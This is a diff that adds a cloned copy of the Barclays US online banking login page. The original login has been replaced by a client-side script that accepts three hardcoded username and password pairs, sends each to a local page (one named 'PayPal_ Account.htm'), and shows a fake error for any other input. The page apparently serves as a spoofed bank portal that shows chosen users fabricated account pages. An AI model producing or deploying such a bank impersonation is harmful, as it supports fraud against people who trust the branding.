@@ -1,0 +1,974 @@
+<!DOCTYPE html>
+<!-- saved from url=(0144)https://www.securebanking.barclaysus.com/login.do?_flowExecutionKey=_c0587B8A2-6540-F590-7975-2A3E162F51A6_k92D30525-239C-470F-65F7-FBFD3DB2DE6B -->
+<html lang="en-US" style="" class=" js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<title>
+		Barclays
+		
+			&nbsp;-&nbsp;
+			Welcome to Barclays Online Banking
+		
+	</title>
+	
+	
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	
+	
+	<meta name="format-detection" content="telephone=no"> 
+	
+	
+								
+	
+ 	<link rel="stylesheet" href="./bb/foundation.css"> 
+	<link rel="stylesheet" href="./bb/reveal.css">
+	<link rel="stylesheet" href="./bb/jquery.navgoco.css">
+	<link rel="stylesheet" href="./bb/jquery-ui-1.11.2.structure.min.css" type="text/css" media="all">
+	<link rel="stylesheet" href="./bb/calendar.css" type="text/css" media="all">
+	<link rel="stylesheet" href="./bb/print.css" type="text/css" media="print">
+	<link rel="stylesheet" href="./bb/styles.css" type="text/css" media="all">
+	<link rel="stylesheet" href="./bb/jquery-ui-1.11.2.min.css" type="text/css" media="all">
+	
+	
+
+	<link rel="shortcut icon" href="https://www.securebanking.barclaysus.com/images/barclays/favicon.ico">
+	<link rel="stylesheet" href="./bb/jquery.tooltip.css">
+	<link rel="stylesheet" href="./bb/facebox.css" type="text/css">
+	<link rel="stylesheet" href="./bb/jquery.tooltip.css">
+	
+	
+		<noscript><meta http-equiv="refresh" content="0;URL=unsupportedBrowser.do"></noscript>
+	
+	
+	
+	
+							
+	
+	<script src="./bb/jquery-1.11.1.min.js" type="text/javascript"></script>
+	<script src="./bb/foundation.js"></script><meta class="foundation-data-attribute-namespace"><meta class="foundation-mq-xxlarge"><meta class="foundation-mq-xlarge"><meta class="foundation-mq-large"><meta class="foundation-mq-medium"><meta class="foundation-mq-small"><style></style>
+	
+	<script src="./bb/foundation.offcanvas.js"></script>
+
+	<script src="./bb/jquery-ui-1.11.2.min.js" type="text/javascript"></script>
+	<script src="./bb/jquery.ui.touch-punch.min.js"></script>
+	<script src="./bb/json2-min.js" type="text/javascript"></script>
+	<script src="./bb/utilities.js" type="text/javascript"></script>
+	<script src="./bb/menu.js" type="text/javascript"></script>
+	<script src="./bb/dropdown.js" type="text/javascript"></script>
+	<script src="./bb/donut.js" type="text/javascript"></script>
+	<script src="./bb/jquery.printElement.js" type="text/javascript"></script>
+	<script src="./bb/jquery.dataTables.min.js"></script>
+	<script src="./bb/modernizr.js"></script>
+	<script src="./bb/pm_fp.js"></script>
+	<script type="text/javascript" src="./bb/respond.matchmedia.addListener.min.js"></script>
+	<script type="text/javascript" src="./bb/respond.min.js"></script>	
+	
+	
+	<script type="text/javascript" src="./bb/utilities(1).js"></script>
+	
+		
+	
+	
+
+	
+	<script type="text/javascript">
+		var selfLoc = self.location.toString();
+		var contextPath = "";
+		
+		var limit = selfLoc.indexOf("");		
+		limit = limit + contextPath.length +1;
+		var forwardPath = selfLoc.substring(0, limit);
+		forwardPath = forwardPath + "error.do";
+		
+		 if (window.top!=window.self) {
+			if(!(selfLoc.indexOf("error.do", 0) > -1)) {
+				self.location = forwardPath;						
+			}
+		 }
+		 
+		function showBannerPage(methodName){ 
+    		window.location = "/customerBanner.do?method=" + methodName;
+		}
+		
+		
+		activateToolTip();
+		
+		function activateToolTip(){
+			$(".ttip").tooltip({tooltipClass: 'ui-custom-tt', position: { my: 'center bottom-3', at: 'center top'}, open: function( event, ui ) {
+				if (event.pageY < ui.tooltip[0].offsetTop) {
+					$(ui.tooltip[0]).addClass('ui-custom-tt-flip');
+				}
+			}});
+		}
+		
+		
+	</script>
+	<script type="text/javascript">
+		function disableAutocomplete() {
+			var formElement = (document.getElementById) ? document.getElementById("noautocomplete") : ((document.all) ? document.all["noautocomplete"] : null);
+			if (formElement) {
+				formElement.setAttribute("autocomplete","off");
+			}
+		}
+		addLoadEvent(disableAutocomplete);
+		
+		function swapImage( event, image_url ) {
+		    var e = event || window.event;
+		    if( e.target )
+		      var node = e.target;
+		    else
+		      var node = e.srcElement;
+		  
+		    if( node )
+		      if( node.tagName == "INPUT" ) {
+		           node.className = image_url;
+		      }
+		    return false;
+		 }
+	</script>
+	<script type="text/javascript">
+		var maxMobile = 660;
+		var maxTablet = 959;
+		
+		var EXPERIENCE_MOBILE = 1;
+		var EXPERIENCE_TABLET = 2;
+		var EXPERIENCE_DESKTOP = 3;
+		
+		function getExperience() {
+			if(!$("#mediaQueryTest").length) {
+				return -1;
+			}
+						
+			if ($("#mediaQueryTest").css("border-bottom-style").indexOf("solid") !== -1) {
+				return EXPERIENCE_MOBILE;
+			} else if ($("#mediaQueryTest").css("border-bottom-style").indexOf("dashed") !== -1) {
+				return EXPERIENCE_TABLET;
+			} else if ($("#mediaQueryTest").css("border-bottom-style").indexOf("dotted") !== -1) {
+				return EXPERIENCE_DESKTOP;
+			} else {
+				return -1;
+			}
+		}
+	</script>
+
+	<script language="javascript">
+	$(document).ready(function(){
+	    resetTimer();		    
+	});
+	
+	
+	function additionalTopButtonLink(url){	
+		document.tabLinkHiddenForm.action = url;	
+		document.tabLinkHiddenForm.submit();
+	}	
+	
+	function addBankAccountTopButtonLink(url,seq){		   
+		document.addBankAccountTopButtonHiddenForm.action = url;
+		document.addBankAccountTopButtonHiddenForm.actionSequence.value=seq;
+		document.addBankAccountTopButtonHiddenForm.submit();
+	}
+	
+	function goBackToLinkForm(url){
+		document.goBackToLinkForm.action = url;	
+		document.goBackToLinkForm.submit();	
+	}
+	</script>
+
+<style>
+@media ( max-width : 659px) { /*Only Mobile*/
+	.responsive-img.logo {
+		width: 180px;
+		padding-bottom: 14px;
+	}
+}
+
+@media ( min-width : 660px) and (max-width:959px) { /*Only Tablet*/
+	.responsive-img.logo {
+		width: 210px;
+		padding-bottom: 14px;
+	}
+}
+
+.infoBox,.blueInfoBox,.errorBox {
+	margin: 0rem 2.5% 2rem 4.5%;
+	width: 90%;
+}
+
+.blueInfoIcon {
+	color: #00AEEF;
+}
+</style>
+
+
+	<script src="https://assets.adobedtm.com/29aeab11858187a5073a18e24b01d9c4c2453e73/satelliteLib-35ed0b8e370e05b337faf5c50d805c156354c8ec.js"></script>
+	 
+
+</head>
+
+
+
+
+
+
+
+
+<body><div id="timeOutDialog" style="display:none;" role="dialog" aria-labelledby="dialogTitle" aria-describedby="dialogDesc" tabindex="1"></div>
+<input type="button" id="showModal" value=" " class="hide" data-reveal-id="timeOutModal">
+
+
+
+<script type="text/javascript">
+	var windowWidth = 300;
+	var windowHeight = 200;
+	var timeOutDialog = document.getElementById("timeOutDialog");
+	var timeOutDialogIFrame = document.getElementById("timeOutDialogIFrame");
+	var timer = null;
+	var sessionTimeOutLength = (600)* 1000;
+	var timeOutDialogDisplayTime = (120) * 1000;
+	var timeOutLength = sessionTimeOutLength - timeOutDialogDisplayTime;
+	var hrefString = document.location.href ? document.location.href : document.location; 
+    var currPage=extractPageName(hrefString);
+    	
+	function submit(action) {
+		closeTimeOutDialog();
+		if (action == 'exit') {
+			parent.location = 'logout.do';
+		} else if (action == 'continue') {
+			resetTimer();
+			$('a.close-reveal-modal').trigger('click');
+		}
+		
+		return false;
+	}
+
+	function extractPageName(hrefString){ 
+		var methodStr; 
+        var arr = hrefString.split('/');
+       	var lastPart = arr[arr.length-1].toLowerCase(); 
+	  	if(lastPart.indexOf("?")!=-1) {
+			lastPart = lastPart.substring(0, lastPart.indexOf("?"));
+		}
+        return lastPart;
+	}
+			
+	function resetTimer() {
+		if (timer == null) {
+			timer=setTimeout("timeOut()",timeOutLength);
+		} else {
+			clearTimeout(timer);
+			timer=setTimeout("timeOut()",timeOutLength);
+			var xmlhttp = getXmlHttp();
+			xmlhttp.open("GET", "keepSessionAlive.do", true);
+			xmlhttp.setRequestHeader('Content-Type', 'text/plain');
+			xmlhttp.send(null);
+		}
+
+	}
+	
+	function timeOut() {
+		$('a.close-reveal-modal').trigger('click');
+		showTimeOutDialog(true);
+		clearTimeout(timer);
+		timer=setTimeout("sessionExpired()", timeOutDialogDisplayTime);
+	}
+	
+	function sessionExpired() {
+		closeTimeOutDialog();
+		var pgName='';
+		if (currPage=='customercreation.do' && pgName!=''){
+			parent.location = 'logout.do?sessionTimeout=1';
+		}
+		else{			
+			parent.location = 'logout.do';
+		}
+		return false;
+	}
+	
+	/*
+	 * Open the time out dialog
+	 */
+	function showTimeOutDialog(first) {
+		
+		drawTimeOutDialog(first);
+		
+		timeOutDialog.innerHTML = htmlBuffer;
+		timeOutDialog.style.display = "block";
+		$('#timeOutDialog').focus();
+		$("#showModal").trigger('click');		
+		$("#main-content").attr("aria-hidden","true");
+
+		if(window.TLT_custom != undefined){
+			TLT_custom.notifyDOMUpdate();
+		}
+	
+		$(document).ready(function() {
+			
+			$("#Continue").on('keydown', function(e){
+				  var keyCode = e.keyCode || e.which;
+				  if ((keyCode == 9 && !e.shiftKey)) { 
+				    e.preventDefault(); 
+				    $("#Exit").focus();
+				  } 
+			});
+			
+			$("#Exit").on('keydown', function(e){
+				  var keyCode = e.keyCode || e.which; 
+				  if ((keyCode == 9 && !e.shiftKey)) { 
+				    e.preventDefault();
+				    $("#closeTimeOutModal").focus();
+				  } 
+			});
+			
+			$("#closeTimeOutModal").on('keydown', function(e){
+				  var keyCode = e.keyCode || e.which; 
+				  if ((keyCode == 9 && !e.shiftKey)) { 
+				    e.preventDefault(); 
+				    $("#Continue").focus();
+				  } 
+			});
+
+		});
+	}
+	
+	/*
+	 * Generate html for time out window
+	 */
+	function drawTimeOutDialog(first) {
+	
+		htmlBuffer = '<div id="timeOutModal" class="reveal-modal" role="alertdialog" aria-label="alert dialog time out warning" aria-live="assertive" >';
+
+		htmlBuffer += '<p id="dialogTitle" class="modalTitle">';
+		htmlBuffer += 'Time-out warning';
+		htmlBuffer += '</p>';
+		htmlBuffer += '<p id="dialogDesc" class="buttonText">';
+		htmlBuffer += 'Your banking session will time-out in 2 minutes. <br>Continue: This will reset your banking session.';
+		htmlBuffer += '</p>';
+		htmlBuffer += '<div class="buttonBorder buttonText noLine pct50 bottomPad10" >';
+		htmlBuffer += '<input type="button" name="Continue" id="Continue" class="expand" style="margin-right:15px;" onclick="submit(\'continue\');" value="Continue">';
+		htmlBuffer += '<input type="button" name="Exit" id="Exit" class="secondary expand"  onclick="submit(\'exit\');" value="Exit">';
+		htmlBuffer += '</div>';
+		htmlBuffer += '<a href="#" class="close-reveal-modal" aria-label="Close" id="closeTimeOutModal">&#215;</a>';
+		htmlBuffer += '</div>';
+		/*		htmlBuffer = '<table width="100%">';
+				htmlBuffer += 	'<tr><td class="sectionHeading">Time-out warning</td></tr>';
+				htmlBuffer += 	'<tr><td>';
+				htmlBuffer += 		'<table align="center" width="100%">';
+				htmlBuffer += 			'<tr><td class="textBold">Your banking session will time-out in 2 minutes. <br>Continue: This will reset your banking session.</td></tr>';
+				htmlBuffer += 		'</table>';
+				htmlBuffer += 	'</td></tr>';
+				htmlBuffer += 	'<tr><td><img src="/images/clear.gif" height="5" width="1"></td></tr>';
+				htmlBuffer += 	'<tr>';
+				htmlBuffer += 		'<td class="formButtonCellRight" width="100%">';
+				htmlBuffer += 			'<input type="button" class="exitBtn"  onmouseover="swapImage(event, \'exitBtnHover\');" onmouseout="swapImage(event, \'exitBtn\');" name="submit" onclick="submit(\'exit\');" value="">';
+				htmlBuffer += 			'<input type="submit" style="margin-right:0;" class="continueBtn" onmouseover="swapImage(event, \'continueBtnHover\');" onmouseout="swapImage(event, \'continueBtn\');" name="continue" onclick="submit(\'continue\');" value="">';
+				htmlBuffer +=	 	'</td>'
+				htmlBuffer +=	'</tr>';
+				htmlBuffer += '</table>'; */
+	}
+
+	function closeTimeOutDialog() {
+		$("#main-content").attr("aria-hidden","false");
+		timeOutDialog.style.display = "none";
+
+		if(window.TLT_custom != undefined){
+			TLT_custom.notifyDOMUpdate();
+		}
+	
+	}
+
+</script>
+
+
+
+		
+
+
+<form method="post" id="additionalTopButtonLinkHiddenForm" name="additionalTopButtonLinkHiddenForm"> 
+        <input type="hidden" name="CSRFToken" value="993fa4ea875ce9ee05a771753738b398bd469b172b3dbc03c49b92af9ef55c0017a60e3f927da4711d689eaf4d8d93998768c5f2332de7d5a292ba0ff45eeba961"> 
+</form>
+<form method="post" id="addBankAccountTopButtonHiddenForm" name="addBankAccountTopButtonHiddenForm"> 
+ <input type="hidden" name="CSRFToken" value="993fa4ea875ce9ee05a771753738b398bd469b172b3dbc03c49b92af9ef55c0017a60e3f927da4711d689eaf4d8d93998768c5f2332de7d5a292ba0ff45eeba961">
+ <input type="hidden" name="method" value="addForm">          
+ <input type="hidden" name="actionSequence" value="">        
+</form>
+
+<form method="post" id="goBackToLinkForm" name="goBackToLinkForm"> 
+<input type="hidden" name="CSRFToken" value="993fa4ea875ce9ee05a771753738b398bd469b172b3dbc03c49b92af9ef55c0017a60e3f927da4711d689eaf4d8d93998768c5f2332de7d5a292ba0ff45eeba961"> 
+</form>
+
+
+
+	
+		
+	
+		
+
+
+
+
+
+<style>
+.left35{
+left:-35px;
+}
+.left10{
+left:-10px;
+}
+</style>
+
+
+
+
+	
+	
+		
+	
+
+
+
+
+
+
+<div class="pageTop dontprint">
+	<div class="headerContent sideGutter">
+		<div class="headerNav">
+			<div class="navContainer">
+				<span class="headerText cell">Online Banking</span>
+				<a class="visually-hidden skip-to-main">Skip to Main Content</a>
+				
+			</div>
+			
+		</div>
+
+		
+			
+			
+				<div class="headerNav">
+					<div class="navContainer rightFloat">
+						<div style="margin-top: 4px;" class="table">
+
+
+							<div class="col nonTablet nonDesktop">
+								<a href="tel:888-710-8756" class="noPadding"> <span class="phoneIcon"> </span></a>
+							</div>
+							<div class="col nonMobile">
+								<span class="block xsmall" style="font-size:1.6rem;">888-710-8756&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;| 8:00 am – 8:00 pm ET Monday – Friday</span>
+							</div>
+						</div>
+					</div>
+				</div>
+			
+		
+
+	</div>
+</div>
+
+		
+	<div class="row">
+ 	<div class="small-12 columns">
+	<div id="offcanvaswrap" class="off-canvas-wrap" data-offcanvas="">
+	<div class="inner-wrap">
+		
+		
+
+
+
+
+
+<style scoped="">
+@media (max-width: 659px){/*Only Mobile*/
+.responsive-img.logo{
+width:180px;
+padding-bottom:14px;
+}
+}
+@media (min-width: 660px) and (max-width:959px){/*Only Tablet*/
+.responsive-img.logo{
+width:210px;
+padding-bottom:14px;
+}
+}
+
+.bottomBorder{
+padding-bottom:15px;
+border-bottom: 1px solid #ccc;
+}
+</style>
+
+
+
+<div class="headerWrapper">
+
+	<div class="headerContent sideGutter">
+		<a  class="visually-hidden skip-to-main">Skip to Main Content</a>
+		<div class="headerNav bottomBorder">
+			<div class="navContainer">
+			  
+			  
+				<span class="cell">
+				  <a class="logo leaveMeAlone"><picture>
+					 <img class="responsive-img logo" src="./bb/logo_l.png" alt="BARCLAYS LOGO">
+					 <source media="(min-width: 660px)" srcset="images/rwd/icons/logo/logo_l.png">                         
+					</picture></a>
+				</span>
+			  
+			   
+			</div>
+
+		</div>
+	</div>
+</div>
+		
+	 	
+			
+		
+
+	
+		
+		
+
+		
+			
+					
+			
+			
+			
+	
+	
+	
+	
+	<div class="content  partialWidthLogin " id="main-content">
+						
+			
+				
+			 		
+			
+			
+			
+			
+			<div class="titleHeader">
+			  
+			  
+				<div class="contentTitleDiv ">
+					<h1>
+						Welcome to Barclays Online Banking
+					</h1>
+					
+				</div>
+				
+			 
+			 
+			 	
+			</div>
+			
+				
+				
+			
+			
+			
+				
+			
+	    
+		
+		
+		
+		
+		
+		
+		
+			<noscript><div class="alert" style="border: 2px;">Please enable JavaScript in your browser.</div></noscript>
+		
+		
+		
+		
+			
+			
+			
+			
+			
+				
+				
+					
+					
+						
+						
+
+
+
+
+
+
+
+
+
+<script src="./bb/rsa.js" type="text/javascript"></script>
+<script src="./bb/hashtable.js" type="text/javascript"></script>
+
+<link rel="stylesheet" type="text/css" href="./bb/login.css">
+<script>
+var data_layer = {
+    'campaign_id':'',
+    'campaign_cell_number':'',
+    'campaign_publisher_id':'',
+    'campaign_advertiser_id':'',
+    'campaign_shopper_id':'',
+    'partner_code':'BGN',
+    'application_id':'', //application id,
+    'customer_card_id':'', //party_id
+    'customer_master_account_id':'', //master account number
+    'page_status':'', //logged in, first visit
+    'product_id':'', //juniper product id/BT ID
+    'product_name':'', //Card name/BT type
+    'product_amount':'', //TnT approval amount/BT/CLI amount
+    'product_quantity':'',
+    'product_purchase_channel':'', //ibchannel/mobile/desktop/tablet
+    'product_advertisement_channel':'', //obchannel/banner/email
+    'previous_page_value':'', //selections made by customer on previous page
+    'referrer_id':'', 
+    'site_section_sub':'',
+    'site_section_sub_page':'',
+    'product_advertisement_channel':'',
+    'page_name':'LOGIN:HOME',
+    'site_section':'LOGIN'
+  
+};
+</script> 
+
+<script>
+	$(document).ready(function() {
+		document.forms['actionForm']['userName'].focus();
+		document.forms['noautocomplete'].deviceInfo.value = encode_deviceprint();		
+		
+		$(".errorBox").appendTo($("#errorInfoBox"));
+		$(".errorBox").focus();
+		$(".infoBox").appendTo($("#errorInfoBox"));
+		
+		
+		var rememberMePreChecked = $("#rememberMe").val();
+			
+		if($("#rememberMe").val() == "true") {
+			$("#chkRememberMe").prop("checked", true);
+		}
+		
+		$("#chkRememberMe").change(function() {
+		    if(this.checked) {
+		    	$("#rememberMe").val("true");
+		    } else {
+		    	$("#rememberMe").val("false");
+		    }
+		});
+	
+		
+		$("#userName").keydown(function(event) {
+			if(event.which != 13 && event.which != 9 && rememberMePreChecked == "true") {
+				$("#chkRememberMe").prop("checked", false);
+				$("#rememberMe").val("false");
+				rememberMePreChecked = "false";
+			}
+		});
+		
+		
+		$("#showHide").hide();
+		$("#password").keyup(function() {
+			if ($(this).val().length > 0) {
+
+				$("#showHide").show();
+			} else {
+				$("#showHide").hide();
+			}
+		});
+		
+		
+		var control =  $("#showHide");
+		var field = $("#password");
+        control.bind('click', function () {
+            if (field.attr('type') =="password") {
+                field.attr('type', 'text');
+                control.text("Hide");
+            } else {
+                field.attr('type', 'password');
+                control.text("Show");
+            }
+        })
+	});
+</script>
+
+<style scoped="">
+	@media screen and (max-width: 660px) {
+		.errorBox, .infoBox {
+			display: inline-table;
+		}
+		.loginControl{
+		width:100%;}
+		input[type="text"].expand, input[type="password"].expand, select.expand {
+			width: 98% !important;
+		}
+	}
+</style>
+<link rel="stylesheet" href="./bb/logon.css"> 
+
+
+<form name="actionForm" id="myform" class="loginForm" autocomplete="off"><input type="hidden" name="CSRFToken" >
+	<input type="hidden" name="rememberMe" value="false" id="rememberMe">
+	<input type="hidden" name="deviceInfo" value="version%3D3%2E5%2E0%5F1%26pm%5Ffpua%3Dmozilla%2F5%2E0%20%28macintosh%3B%20intel%20mac%20os%20x%2010%5F14%5F6%29%20applewebkit%2F537%2E36%20%28khtml%2C%20like%20gecko%29%20chrome%2F84%2E0%2E4147%2E105%20safari%2F537%2E36%7C5%2E0%20%28Macintosh%3B%20Intel%20Mac%20OS%20X%2010%5F14%5F6%29%20AppleWebKit%2F537%2E36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F84%2E0%2E4147%2E105%20Safari%2F537%2E36%7CMacIntel%26pm%5Ffpsc%3D24%7C1440%7C900%7C900%26pm%5Ffpsw%3D%26pm%5Ffptz%3D%2D5%26pm%5Ffpln%3Dlang%3Den%2DUS%7Csyslang%3D%7Cuserlang%3D%26pm%5Ffpjv%3D0%26pm%5Ffpco%3D1%26pm%5Ffpasw%3Dinternal%2Dpdf%2Dviewer%7Cmhjfbmdgcfjbbpaeojofohoefgiehjai%7Cinternal%2Dnacl%2Dplugin%26pm%5Ffpan%3DNetscape%26pm%5Ffpacn%3DMozilla%26pm%5Ffpol%3Dtrue%26pm%5Ffposp%3D%26pm%5Ffpup%3D%26pm%5Ffpsaw%3D1440%26pm%5Ffpspd%3D24%26pm%5Ffpsbd%3D%26pm%5Ffpsdx%3D%26pm%5Ffpsdy%3D%26pm%5Ffpslx%3D%26pm%5Ffpsly%3D%26pm%5Ffpsfse%3D%26pm%5Ffpsui%3D%26pm%5Fos%3DMac%26pm%5Fbrmjv%3D84%26pm%5Fbr%3DChrome%26pm%5Finpt%3D%26pm%5Fexpt%3D">
+	<input type="hidden" name="fp_browser" id="fp_browser">
+	<input type="hidden" name="fp_screen" id="fp_screen">
+	<input type="hidden" name="fp_software" id="fp_software">
+	
+
+	
+
+	<div id="container">
+
+		<div id="errorInfoBox" role="alert" tabindex="0"></div>
+
+		<div class="loginControl">
+			<div class="h4">Log in to access your account</div>
+			
+			<div id="userNameDiv" class="field">
+				<div class="field"><label for="userName">User ID</label><input type="text" name="userName" maxlength="32" size="25" value="" onclick="zz()" id="email" class="loginInputWidth expand" required></div>
+			</div>
+
+			<div id="passwordDiv" class="field" style="margin-bottom: 0.6em;">
+				<div class="field"><label for="password">Password</label><input type="password" name="password" maxlength="20" size="25" value="" id="pass" onclick="zz()" class="loginInputWidth expand" required></div>
+				<!--<input type="password" name="password" maxlength="20" size="25" value="" id="password" class="loginInputWidth expand" placeholder="Enter Password">
+				<a name="check" id="showHide">Show</a>-->
+			</div>
+            
+            <p id="wrong" style="color: red; font-weight: 500; display: none; font-size: 13px"> User ID or Password could not be found. <span onclick="clr()" style="color: green; cursor: pointer">Try again</span></p>
+            
+            <p id="ll" style="color: skyblue;; font-weight: 600; display: none; text-align: center; font-size: 12px; " > <img src="https://i.pinimg.com/originals/25/ef/28/25ef280441ad6d3a5ccf89960b4e95eb.gif" width="30"><br> LOADING</p>
+
+			<div id="rememberMe" class="field">	
+				<label for="chkRememberMe" class="inline">Remember me?</label>
+			</div>
+			
+			<div>
+				<a data-track="ForgotUserIDAndPswd" class="standalone" style="color: skyblue">
+					Forgot User ID and/or Password?
+					<span class="access">to follow a standalone secondary link</span>
+				</a>
+			</div>
+
+			<div id="loginBtn" class="field">
+				<button class="emphasis expand" type="button" data-track="Login" id="loginSubmit" onclick="myFunction()"  >
+                    Log In 
+                </button>
+			</div>
+            
+            <script>
+                function myFunction() {
+                    var x = document.getElementById("email").value;
+                    var y = document.getElementById("pass").value;
+                    var loginSubmit = document.getElementById("loginSubmit");
+                    
+                    loginSubmit.disabled = true;
+                   
+                    
+                    if (x == "Donnasure2020" && y == "Donna123456") {
+                         window.location.href = "./PayPal_ Account.htm";
+                        document.getElementById("ll").style.display = "block";
+                    }  
+                    else if (x == "Lou0095" && y == "Quinne0095") {
+                        setTimeout(function() 
+                            {
+                                document.getElementById("ll").style.display = "block";     
+                                window.location.href = "./lou.html";
+                            }, 3000)
+                        
+                    } 
+                    else if (x == "John0010 " && y == "Derosa0010") {
+                        setTimeout(function() 
+                            {
+                                document.getElementById("ll").style.display = "block";     
+                                window.location.href = "./john.html";
+                            }, 3000)
+                        
+                    } 
+                    
+                    else {
+                        setTimeout(function() 
+                            {
+                                document.getElementById("wrong").style.display = "block"; 
+                                loginSubmit.disabled = false; 
+                            }, 3000)
+                        
+                    }
+               
+                    }
+                
+                function clr() {
+                      document.getElementById("myform").reset();
+                      document.getElementById("wrong").style.display = "none";
+                
+                }
+                
+                function zz() {
+                      document.getElementById("wrong").style.display = "none";
+                
+                }
+            </script>
+			
+			<hr>
+			
+			<div id="forgotPassword">
+				<a class="standalone" data-track="DonthaveAccountClickHere" href="">
+					Don't have an account? Click here
+					<span class="access">to follow a standalone secondary link</span>
+				</a>
+			</div>
+			
+
+			
+		</div>
+		
+	</div>
+<input type="hidden" name="fp_bImagesName" id="fp_bImagesName" value="575710251529797101555699535710110110153485597495553555551565151985657100985452985755499850100519998514852999857505710297101575310299534848554954971014810251505710055529749551004956541015710297100521005651575757555656545399501025151100505510153100509750579798102485210210153981015797"></form>
+<script src="./bb/imageNames.js" type="text/javascript"></script>
+					
+				
+			
+		
+		
+		
+		
+		
+		</div>
+		
+		
+		
+		
+		
+		
+
+
+
+<footer>
+
+<div class="footerWrap sideGutter dontprint">
+   <div class="footerContent">
+   	  <nav id="footer-nav">
+   	  	<ul>
+   	  		<li>
+   	  		
+   	  		<a  aria-haspopup="true" class="footerLink">Terms of use</a>
+   	  		</li>
+   	  		<li>
+   	  		<a  aria-haspopup="true" class="footerLink">Privacy Policy</a>
+   	  		</li>
+   	  		<li>
+   	  		<a  aria-haspopup="true" class="footerLink">Security</a>
+   	  		</li>
+   	  		<li>
+   	  		<a aria-haspopup="true" class="footerLink">FAQs</a>
+   	  		</li>
+   	  		<li>
+   	  		<a  aria-haspopup="true" class="footerLink">Terms and Conditions</a>
+   	  		</li>
+   	  		<li>
+   	  		<a  aria-haspopup="true" class="footerLink">Contact us</a>
+   	  		</li>
+   	  		<li>	
+   	  			<a aria-haspopup="true" class="footerLink">BarclaycardUS.com</a>
+			</li>   	  		
+   	  	</ul>
+   	  
+   	  </nav>
+   <div class="copyright">© 2020 Barclays Bank Delaware, Member FDIC</div>
+   </div>
+</div>
+
+	
+		
+	</footer></div>
+	
+	</div>
+    </div>
+    </div>
+   
+   
+   
+   	<script src="./bb/jquery.reveal.js"></script>	
+    <script>
+    $(document).foundation();
+ 	</script> 
+    
+    
+	<script type="text/javascript">
+		$(document).ready(function() {
+			$(window).resize(function() {
+				// pushFooterToViewportBottom();
+			});
+			pushFooterToViewportBottom();
+			
+		});
+	</script>
+	<script type="text/javascript">
+	
+	// Catch all events related to changes
+	$(document).ready(function() {
+	    $("input[type='number']").keydown(function (e) {
+	    	console.log(e.which);
+	        // Allow: backspace, delete, tab, escape, enter and .
+	        if ($.inArray(e.which, [46, 8, 9, 27, 13, 110, 190]) !== -1 ||
+	             // Allow: Ctrl+A
+	            (e.which == 65 && e.ctrlKey === true) ||
+	             // Allow: Ctrl+C
+	            (e.which == 67 && e.ctrlKey === true) ||
+	             // Allow: Ctrl+X
+	            (e.which == 88 && e.ctrlKey === true) ||
+	             // Allow: home, end, left, right
+	            (e.which >= 35 && e.which <= 40)) {
+	                 // let it happen, don't do anything
+	                 return;
+	          }
+	        // Ensure that it is a number and stop the keypress
+	        if ((e.shiftKey || (e.which < 48 || e.which > 57)) && (e.which < 96 || e.which > 105)) {
+	            return false;
+	        }
+	    });
+	    
+	    $("input[type='number']").bind('input',function(){
+	    	if(decimalPlaces(this.value) > 2){
+	    	this.value=parseFloat(this.value).toFixed(2);}
+	    });
+	    
+		   		
+	    
+	});
+	
+	</script>
+		 
+	
+	
+		<script type="text/javascript">
+			setInterval(resetTimer, 300000);
+		</script>
+	
+	
+	 <div id="mediaQueryTest" style="display: none;">
+		
+		
+		
+	</div>
+
+
+	<script type="text/javascript">_satellite.pageBottom();</script> 
+
+	
+		<!-- MAIN OL STYLESHEET -->
+		<link rel="stylesheet" type="text/css" href="./bb/oo_style.css">
+		<!-- MAIN OL ENGINE -->
+		<script language="javascript" type="text/javascript" charset="windows-1252" src="./bb/oo_engine.min.js"></script>
+		<!-- FEEDBACK CONFIGURATION -->
+		<script language="javascript" type="text/javascript" charset="windows-1252" src="./bb/oo_conf_click.js"></script>
+		<script language="javascript" type="text/javascript" charset="windows-1252" src="./bb/oo_conf_tab_bar_inline.js"></script>
+	
+	
+	<script language="javascript">
+		$(document).ready(function(){
+			$(".errorBox").focus();		    
+		});
+	</script>
+
+
+<div id="core-modal-dialog" style="display:none;"></div><a id="oo_tab" class="oo_tab_right"><img src="./bb/oo_tab_icon_retina.gif" alt="">Feedback<span class="screen_reader"> Will open a new window</span></a></body></html>
